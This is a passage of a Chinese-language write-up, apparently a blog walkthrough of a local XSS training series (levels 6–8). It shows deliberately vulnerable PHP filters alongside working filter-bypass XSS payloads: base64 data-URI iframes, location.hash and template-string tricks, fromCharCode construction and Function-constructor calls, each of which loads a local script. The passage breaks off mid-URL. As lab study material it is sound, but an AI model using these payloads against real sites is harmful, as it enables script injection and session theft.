punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>独孤九剑-第六式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>独孤九剑-第六式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>过滤了 =().&amp;#\%，少侠骨骼惊奇，必是练武奇才<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>要求加载任意 JS 代码,成功加载 http://127.0.0.1/mpy-web/xss/alert.js 表示完成挑战<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h3 id="base64编码-2"><a class="anchor" href="#base64编码-2">#</a> base64 编码</h3><p>依旧是 base64 绕过</p><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-6.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=</span></span>">&lt;iframe>&lt;/iframe>&lt;script>frames[0]['location']['replace']`data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvbXB5LXdlYi94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg`&lt;/script></pre></td></tr></table></figure><h3 id="locationhashslice"><a class="anchor" href="#locationhashslice">#</a> location.hash.slice()</h3><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-6.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=</span></span>">&lt;script>document['write']`&lt;img $&#123;location['hash']['slice']`1`&#125;`&lt;/script><span class="token fragment"><span class="token fragment-delimiter">#</span>/src='x'onerror=with(document)body.appendChild(createElement('script')).src='http://127.0.0.1/mpy-web/xss/alert.js'//</span></pre></td></tr></table></figure><ol><li>使用 hash 来保存攻击变量</li><li>绕过。使用了 document ['write']，往界面中写入一个标签</li><li>发现一个特殊结构 ${} ，这个结构被称作模版字符串，而 ${} 是模版字符串中的占位符，是 JavaScript 的版本标准 ES6 中的用法</li><li>在模版字符串中，{} 中的内容可以是字符串，也可以是表达式，在输出模版字符串的时候，会将表达式的值计算出来，然后在进行输出</li><li>因此可以理解成 标签先执行了 location.hash.slice (1) 得到了</li></ol><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token path"><span class="token path-separator">/</span>src='x'onerror=with(document)body.appendChild(createElement('script')).src='http:<span class="token path-separator">/</span><span class="token path-separator">/</span>127.0.0.1<span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>alert.js'<span class="token path-separator">/</span><span class="token path-separator">/</span></span></pre></td></tr></table></figure><p>然后嵌入到标签中，就相当于往页面中插入了一个图片，链接为 x 发生错误，之后执行后面的 with 部分</p><h2 id="第七式"><a class="anchor" href="#第七式">#</a> 第七式</h2><p>过滤了 <code>= ( ) . &amp; # \ % &lt; &gt;</code></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">">"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>独孤九剑-第七式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>独孤九剑-第七式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>过滤了 =().&amp;#\%&lt;>，少侠骨骼惊奇，必是练武奇才<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>要求加载任意 JS 代码,成功加载 http://127.0.0.1/mpy-web/xss/alert.js 表示完成挑战<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"></span></span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h3 id="模板字符串"><a class="anchor" href="#模板字符串">#</a> 模板字符串</h3><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-7.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=</span></span>"";document['write']`$&#123;String['fromCharCode']`60`%2B"iframe src"%2BString['fromCharCode']`61`%2B"data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvbXB5LXdlYi94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg"%2BString['fromCharCode']`62`&#125;`</pre></td></tr></table></figure><p>这关的输出点换成了其他</p><p>接下来就是构造 &quot;&quot;; 闭合前一条语句的同时，将后面的语句隔断，类似 SQL 堆叠注入</p><ol><li><code>document['write']</code> 往 HTML 页面写入内容，这里写入的是一个模版字符串，占位符非常长</li></ol><figure class="highlight js"><figcaption data-lang="JavaScript"></figcaption><table><tr><td data-num="1"></td><td><pre>$<span class="token punctuation">&#123;</span>String<span class="token punctuation">[</span><span class="token string">'fromCharCode'</span><span class="token punctuation">]</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">60</span><span class="token template-punctuation string">`</span></span><span class="token operator">%</span>2B<span class="token string">"iframe src"</span><span class="token operator">%</span>2BString<span class="token punctuation">[</span><span class="token string">'fromCharCode'</span><span class="token punctuation">]</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">61</span><span class="token template-punctuation string">`</span></span><span class="token operator">%</span>2B<span class="token string">"data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvbXB5LXdlYi94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg"</span><span class="token operator">%</span>2BString<span class="token punctuation">[</span><span class="token string">'fromCharCode'</span><span class="token punctuation">]</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">62</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><ol start="2"><li>首先是 <code>String['fromCharCode']()</code> ，这个方法的作用时将 Unicode 编码转为一个字符，这里的 <code>String['fromCharCode'](60)</code> 就是 <code>&lt;</code></li><li>然后根据模板字符串的语法，和字符串 iframe 之间需要有一个 + 来进行拼接，但是要注意，payload 是放在 URL 中的，如果 + 不对其进行编码转换会被当成空格（%2B 就是空格）</li><li>同理， <code>String['frameCharCode'](61)</code> 是 <code>=</code> ， <code>String['fromCharCode'](62)</code> 是 <code>&gt;</code> ，将模板字符串占位符中的代码就可以翻译成</li></ol><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly8xMjcuMC4wLjEvbXB5LXdlYi94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr></table></figure><ol start="5"><li>又是 base64 大法</li></ol><h3 id="jsfuck"><a class="anchor" href="#jsfuck">#</a> JSFuck</h3><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-7.php<span class="token path-separator">/</span></span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=<span class="token value">1</span></span><span class="token pair-delimiter">;</span></span>[]['filter']['constructor']`a$&#123;location['hash']['slice']`1`&#125;```<span class="token fragment"><span class="token fragment-delimiter">#</span>with(document)body.appendChild(createElement('script')).src='http://127.0.0.1/mpy-web/xss/alert.js'</span></pre></td></tr></table></figure><ol><li>利用 JSFuck，JSFuck 是一种很深奥的 JavaScript 编程风格，这种风格写的代码仅使用 <code>[、]、(、)、!、+</code> 六种字符</li><li>此编程风格的名字派生自仅使用较少符号写代码的 Brainfuck 语言，与其他深奥的编程语言不通，以 JSFuck 风格写出得代码不需要另外的编译器或解释器来执行，无论浏览器或 JavaScript 引擎中的原生 JavaScript 解释器皆可直接运行</li><li>鉴于 JavaScript 是弱类型语言，编写者可以用数量有限的字符重写 JavaScript 中的所有功能，且可以用这种方式执行任何类型的表达式</li></ol><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>false => ![]</pre></td></tr><tr><td data-num="2"></td><td><pre>true => !![]</pre></td></tr><tr><td data-num="3"></td><td><pre>undefined => [][[]]</pre></td></tr><tr><td data-num="4"></td><td><pre>NaN => +[![]]</pre></td></tr><tr><td data-num="5"></td><td><pre>0 => +[]</pre></td></tr><tr><td data-num="6"></td><td><pre>1 => +!+[]</pre></td></tr><tr><td data-num="7"></td><td><pre>2 => !+[]+!+[]</pre></td></tr><tr><td data-num="8"></td><td><pre>10 => [+!+[]]+[+[]]</pre></td></tr><tr><td data-num="9"></td><td><pre>Array => []</pre></td></tr><tr><td data-num="10"></td><td><pre>Number => +[]</pre></td></tr><tr><td data-num="11"></td><td><pre>String => []+[]</pre></td></tr><tr><td data-num="12"></td><td><pre>Boolean => ![]</pre></td></tr><tr><td data-num="13"></td><td><pre>Function =>[][“filter”]`</pre></td></tr><tr><td data-num="14"></td><td><pre>eval => []["filter"]["constructor"](CODE)()</pre></td></tr><tr><td data-num="15"></td><td><pre>window => []["filter"]["constructor"]("return this")()</pre></td></tr></table></figure><ol start="4"><li>首先是 <code>[]['filter']['constructor']</code> 对应的是 <code>eval</code> ，后面的就是很熟悉的味道</li><li>在 <code>$&#123;location['hash']['slice'](1)&#125;</code> 这个前面，添加了一个字符，说是不添加就会报错（由于 ES6 模板语法的问题导致需要在 $ 前面加一个字符才可以）（猜测是加上的字符就是作为形参来填补位置）</li></ol><h2 id="第八式"><a class="anchor" href="#第八式">#</a> 第八式</h2><h3 id="第一动"><a class="anchor" href="#第一动">#</a> 第一动</h3><p>过滤了 <code>= ( ) . &amp; # \ % &lt; &gt; ' &quot; [ ]</code></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">">"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\""</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>独孤九剑-第八-1式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>独孤九剑-第八-1式<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>过滤了 =().&amp;#\%&lt;>'"[]，少侠骨骼惊奇，必是练武奇才<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>要求加载任意 JS 代码,成功加载 http://127.0.0.1/mpy-web/xss/alert.js 表示完成挑战<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"></span></span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><h4 id="本地iframe调用js"><a class="anchor" href="#本地iframe调用js">#</a> 本地 iframe 调用 JS</h4><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1/mpy-web/xss/xss-8-1.php/?data=Function`b$&#123;name&#125;```<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>with(document)body.appendChild(createElement('script')).src='http://127.0.0.1/mpy-web/xss/alert.js'<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><ol><li>直接本地新建一个网页，往文件中写入这个代码</li><li>这里的 Function () 是一个匿名函数，没有函数名，通过给变量 name 赋值，然后传入模板字符串，然后再执行 JavaScript 文件（点开这个网页的时候，直接执行里面的代码）</li></ol><h4 id="base64编码-3"><a class="anchor" href="#base64编码-3">#</a> base64 编码</h4><figure class="highlight url"><figcaption data-lang="url"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token scheme">http<span class="token scheme-delimiter">:</span></span><span class="token authority"><span class="token authority-delimiter">//</span><span class="token host"><span class="token ipv4-address">127.0.0.1</span></span></span><span class="token path"><span class="token path-separator">/</span>mpy-web<span class="token path-separator">/</span>xss<span class="token path-separator">/</span>xss-8-2.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">data</span>=<span class="token 